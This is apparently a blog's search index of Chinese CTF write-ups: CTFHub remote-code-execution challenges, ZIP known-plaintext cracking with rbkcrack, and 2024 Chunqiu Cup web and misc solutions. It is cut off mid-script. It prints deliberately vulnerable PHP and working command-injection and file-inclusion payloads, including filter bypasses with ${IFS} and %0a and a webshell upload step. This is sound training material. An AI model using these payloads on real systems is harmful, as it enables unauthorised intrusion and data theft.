<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFHub技能树-rce</title>
      <link href="/posts/72fb0684.html"/>
      <url>/posts/72fb0684.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="eval执行">eval执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>没有任何绕过，直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="文件包含">文件包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>审计代码，发现过滤了flag关键字，include包含文件的内容，根据提示，发现有个shell.txt文件，而且文件内容是接受传参请求，可以利用这个漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>所以思路就是文件包含shell.txt文件，然后传参触发eval函数来rce。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>有个phpinfo()的网页，打开，搜索flag，没有。</p><p>根据提示使用php://input协议</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="读取源代码">读取源代码</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>根据代码和提示，要使用php协议读取目录/flag</p><p>直接使用filter协议读取，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="远程包含">远程包含</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>跟上面的题目一样,直接使用php://input，然后写入一句话木马</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>蚁剑连接，拿到flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="命令注入">命令注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来是一个ping网址的功能，先试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>打开278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="过滤cat">过滤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了cat，但是可以用tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>过滤了空格可以用${IFS}代替</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="过滤目录分隔符">过滤目录分隔符</h2><p>过滤了目录分隔符，但是可以使用命令拼接来找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="过滤运算符">过滤运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了|和&amp;符号，但是可以用分号;</p><blockquote><p>ctfhub{83f8b09d42bb7631282a83b4}</p></blockquote><h2 id="综合过滤练习">综合过滤练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下，过滤了|&amp;; ，可以使用%0a来作为回车符使用，效果一样</p><p>过滤三个关键字cat,flag,ctfhub，可以使用两个单引号或者两个双引号绕过</p><p>过滤空格，可以使用${IFS}绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als$&#123;IFS&#125;-al%0acd$&#123;IFS&#125;fla&#x27;&#x27;g_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;f*</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130130405955.png" alt="image-20241130130405955"></p><blockquote><p>ctfhub{cbff46daeb4e000265fb35d6}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种明文攻击</title>
      <link href="/posts/fcd8d963.html"/>
      <url>/posts/fcd8d963.html</url>
      
        <content type="html"><![CDATA[<h4 id="一、完整的明文文件">一、完整的明文文件</h4><p>要达成明文攻击需要注意以下三点</p><p>①完整的明文文件</p><p>②明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</p><p>③明文对应文件的加密算法需要是 ZipCrypto（ZipCrypto又分为ZipCrypto Deflate/ZipCrypto Store）</p><p>使用ARCHPR进行明文攻击</p><p>破解时长应该不超过5分钟，运行至5分钟左右可以手动停止，ARCHPR会跳出来破解出的三个key。当然，这个结果并不是压缩包的密码，而是一个去除密码的压缩包<code>xxx_decrypted.zip</code>，把这个文件直接解开就可以了。</p><p>用以上方法需要已知一整个明文文件。</p><h4 id="二、已知一部分明文">二、已知一部分明文</h4><p>使用rbkcrack只需要知道加密压缩包内容的连续12个字节，即可进行攻击破解。同时，结合各类已知的文件格式，更扩宽了ZIP已知明文攻击的攻击面。</p><blockquote><p>rbkcrack下载地址：</p><p><a href="https://github.com/Aloxaf/rbkcrack">https://github.com/Aloxaf/rbkcrack</a></p></blockquote><p>rbkcrack常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C 加密的压缩包</span><br><span class="line">-c 压缩包内加密的文件</span><br><span class="line">-p 明文内容</span><br><span class="line">-k 输入key</span><br><span class="line">-o 偏移量</span><br><span class="line">-d 攻击完成后导出解密文件</span><br><span class="line">-u 自动解压</span><br></pre></td></tr></table></figure><p>实例：</p><p>png是制作的png文件头</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack<span class="selector-class">.exe</span> -C LP<span class="selector-class">.zip</span> -c LP<span class="selector-class">.png</span> -<span class="selector-tag">p</span> png</span><br></pre></td></tr></table></figure><p>拿到key后进行解密</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack.exe -C LP.zip -c LP.png -k <span class="number">0f</span>518bd2 <span class="number">680365f</span>9 <span class="number">0</span>ecf26a8 -d <span class="keyword">out</span>.png</span><br></pre></td></tr></table></figure><p>因为LP.zip是以ZipCrypto Deflate方式加密的</p><p>所以解密后注意得到的out.png是deflate的数据流，需要使用python脚本进行解码</p><p>在rbkcrack的tools里找到这个脚本</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年春秋杯网络安全联赛冬季赛wp-1.19</title>
      <link href="/posts/55fde2b7.html"/>
      <url>/posts/55fde2b7.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-php">easy_php</h4><blockquote><p>考点：文件上传绕过，截断，源码审计</p></blockquote><p>打开网站后，可以下载源码，先下载源码，然后再扫一下网站目录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>配合源码审计，审计过程省略。其中在文件上传的目录下已经有文件了，再结合提示可以知道，不用再自己上传文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>那么就需要触发文件，看这里代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>可以知道在/file.php页面中可以进行url的get传参，然后会将参数值过滤后进行高亮，触发反序列化链。</p><p>但是这里的过滤中，是f1ag而不是flag，所以其实没有过滤flag关键词。</p><p>因此结合源码，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code">easy_code</h4><blockquote><p>考点：利用PHP特性绕过，filter伪协议</p></blockquote><p>访问/robots.txt 可以看到有 gogogo.php</p><p>ctfer 参数有三个检测，只需要用科学计数法，PHP 会自动四舍五入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar 里设置 cookie 为 pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024春秋杯冬季赛三日Writeup汇总(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include 那里使用 php://filter 配合 convert.iconv 修改字符集使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="音频的秘密">音频的秘密</h4><blockquote><p>考点：知道部分明文破解压缩包</p></blockquote><p>下载附件解压，是一个wav文件，根据提示知道，是deepsound加密，且密码为弱口令。</p><p>用deepsound解密，弱口令密码一个一个试，最后密码为123，得到一个flag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>提取出来，发现需要密码，压缩包内是一张图片。</p><p>用各种工具爆破，发现长时间都没爆破出来，最后赛后复现，看别人wp才知道，明文加密除了使用完整明文文件外，也有一种使用一部分明文文件的爆破方式。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>得到一张png图片，在rgb处发现flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity">Infinity</h4><blockquote><p>考点：套娃压缩包，解码</p></blockquote><p>下载压缩包解压，里面是张png图片，放进010editor查看，发现有嵌套文件。</p><p>进行文件分离，得到一个压缩包。</p><p>压缩包里有zip,tar,7z三种，且压缩包名字感觉像是某种编码。</p><p>写脚本直接解压并记下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>解压后得到一个SeCr3t.txt，文件内容是Inf1nityIsS0CoOL。</p><p>用脚本对这些字符串进行处理，发现在逆序的时候能根据提示进行解码。即代码中的第二个print。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#文本之中每行有一个字符串</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #将每行字符串顺序连接起来</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #将每行字符串逆序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #将每行字符串反转后顺序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #将每行字符串反转后再逆序连接起来</span><br></pre></td></tr></table></figure><p>根据提示知道，是BASE58-Ripple<code>+</code>SM4-ECB，sm4中的key改为上述文件内容，得到一张条形码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>由于下载下来的图片是很暗的，很难直接识别，所以要先加白底。简便方法就i是直接预览加截图保存，然后扫描截图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年春秋杯网络安全联赛冬季赛wp-1.18</title>
      <link href="/posts/22fad221.html"/>
      <url>/posts/22fad221.html</url>
      
        <content type="html"><![CDATA[<h4 id="Weevil’s-Whisper">Weevil’s Whisper</h4><blockquote><p>考点：流量分析，代码审计</p></blockquote><p>下载附件，进行流量分析，看到上传的代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118152835441.png" alt="image-20250118152835441"></p><p>进行代码审计可以知道，在http中的返回结果是由$p$kh$r$kf组成的，而$p,$kh,$kf是固定的，所以可以提取出来$r。</p><p>再看代码，$r是$o进行一系列加密而成，而$o就是执行完成后返回的结果，所以只需要写脚本反解$r就能出现结果。</p><p>exp:</p><p>提取$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 示例字符串列表</span><br><span class="line">strings = [</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUFRXAGExNS5kaQ==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUVRSBofUNDFgR2Uu4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6KU+uuy3+Gn+oqy3SgTM2GBxmng==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    